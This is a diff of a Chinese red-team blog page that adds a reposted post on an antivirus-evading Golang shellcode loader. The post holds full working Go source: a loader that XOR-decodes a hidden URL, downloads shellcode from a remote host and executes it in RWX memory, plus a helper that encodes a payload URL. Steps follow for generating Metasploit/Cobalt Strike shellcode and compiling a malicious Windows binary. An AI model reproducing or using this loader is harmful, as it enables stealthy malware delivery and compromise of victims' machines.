@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>渗透技巧 | rebootORZ</title>
+<title>Golang shellcode 免杀加载器 | rebootORZ</title>
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -32,6 +32,7 @@
 
   </head>
   <body>
+  
     <nav class="navbar border fixed split-nav">
   <div class="nav-brand">
     <h3><a href="https://rebootorz.github.io">rebootORZ</a></h3>
@@ -96,64 +97,172 @@
     <div id="top" class="row site">
       <div class="sm-12 md-8 col">
         <div class="paper">
-          <h2 class="current-tag">标签: 渗透技巧</h2>
-          
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/HAUEHo9Ma/">记录文件上传Tips（Updating）</a>
-    </h2>
-    <p class="article-meta">
-      2021-02-07
-      
-        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge ">
-          渗透技巧
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/HAUEHo9Ma/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+          <article class="article">
+            <h1>Golang shellcode 免杀加载器</h1>
+            <p class="article-meta">
+              2021-02-08
+              
+                <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge ">
+                  Golang
+                </a>
+              
+                <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
+                  红队
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <p>【转载】https://github.com/An0ny-m0us/DesertFox</p>
+<h1 id="desertfoxgo">DesertFox.go</h1>
+<pre><code>package main
 
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/aC7_yNHBz/">记录一些突破性的XSS Payload（Updating）</a>
-    </h2>
-    <p class="article-meta">
-      2021-02-05
-      
-        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge success">
-          渗透技巧
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/aC7_yNHBz/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+import (
+	&quot;io/ioutil&quot;
+	&quot;log&quot;
+	&quot;net/http&quot;
+	&quot;os&quot;
+	&quot;strconv&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+)
 
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
 
+var (
+	kernel32           = syscall.MustLoadDLL(&quot;kernel32.dll&quot;)
+	ntdll              = syscall.MustLoadDLL(&quot;ntdll.dll&quot;)
+	VirtualAlloc       = kernel32.MustFindProc(&quot;VirtualAlloc&quot;)
+	procVirtualProtect = syscall.NewLazyDLL(&quot;kernel32.dll&quot;).NewProc(&quot;VirtualProtect&quot;)
+	// RtlCopyMemory      = ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)
+	RtlMoveMemory        = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)
+	XorKey        []byte = []byte{0x32, 0x34, 0x85, 0x6A, 0xA3, 0xFF, 0xF4, 0x7B}
+	Url           string
+)
+
+func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	ret, _, _ := procVirtualProtect.Call(
+		uintptr(lpAddress),
+		uintptr(dwSize),
+		uintptr(flNewProtect),
+		uintptr(lpflOldProtect))
+	return ret &gt; 0
+}
+
+func checkErr(err error) {
+	if err != nil {
+		if err.Error() != &quot;The operation completed successfully.&quot; {
+			println(err.Error())
+			os.Exit(1)
+		}
+	}
+}
+
+func dec(src string) (res string) {
+	var s int64
+	var result string
+	j := 0
+	bt := []rune(src)
+	//fmt.Println(bt)
+	for i := 0; i &lt; len(src)/2; i++ {
+		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
+		result = result + string(byte(s)^XorKey[j])
+		j = (j + 1) % 8
+	}
+	return result
+}
+
+func main() {
+	//下方填上异或加密(encryptUrl.go)后的url
+	Url := dec(&quot;Ciphertext&quot;)
+	var charcode []byte
+	var CL http.Client
+	resp, err := CL.Get(Url)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == http.StatusOK {
+		bodyBytes, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			log.Fatal(err)
+		}
+		charcode = bodyBytes
+	}
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		checkErr(err)
+	}
+	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;charcode[0])), uintptr(len(charcode)))
+	checkErr(err)
+
+	for j := 0; j &lt; len(charcode); j++ {
+		charcode[j] = 0
+	}
+
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+</code></pre>
+<h1 id="encrypturlgo">encryptUrl.go</h1>
+<pre><code>package main
+
+import (
+	&quot;fmt&quot;
+	&quot;strconv&quot;
+)
+
+var XorKey []byte = []byte{0x32, 0x34, 0x85, 0x6A, 0xA3, 0xFF, 0xF4, 0x7B}
+var result string
+
+func main() {
+	j := 0
+	s := &quot;&quot;
+	src := &quot;http://10.10.99.190:8080/payload.bin&quot;
+	bt := []rune(src)
+	for i := 0; i &lt; len(bt); i++ {
+		s = strconv.FormatInt(int64(byte(bt[i])^XorKey[j]), 16)
+		if len(s) == 1 {
+			s = &quot;0&quot; + s
+		}
+		result = result + (s)
+		j = (j + 1) % 8
+	}
+	fmt.Println(result)
+
+}
+</code></pre>
+<h1 id="用法">用法</h1>
+<p>1.利用MSF/CS生成shellcode（raw格式），上传至远程服务器<br>
+2.使用encryptUrl.go将shellcode文件所在的远端URL地址进行加密处理<br>
+3.将主程序（DesertFox.go）中Ciphertext字段替换成加密的字符串<br>
+4.编译生成恶意文件</p>
+<pre><code>CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build DesertFox.go
+</code></pre>
+
+            </div>
+          </article>
         </div>
-        <div class="row flex-edges">
-  
-  
-</div>
-
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://rebootorz.github.io/d08DQeKXz/">
+                <h3 class="post-title">
+                  [Go] 跨平台编译
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
       </div>
+
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
     <img src="https://rebootorz.github.io/images/avatar.png?v=1612729480716" class="no-responsive avatar">
@@ -284,19 +393,19 @@
     </div>
     <div class="row">
       
-        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge ">
+        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge success">
           Golang
         </a>
       
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
           红队
         </a>
       
-        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge ">
           渗透技巧
         </a>
       
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge ">
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge success">
           物联网安全
         </a>
       
@@ -306,6 +415,7 @@
     高度自律  绝对自由 | <a class="rss" href="https://rebootorz.github.io/atom.xml" target="_blank">RSS</a>
   </div>
 </div>
+
 
     </div>
 
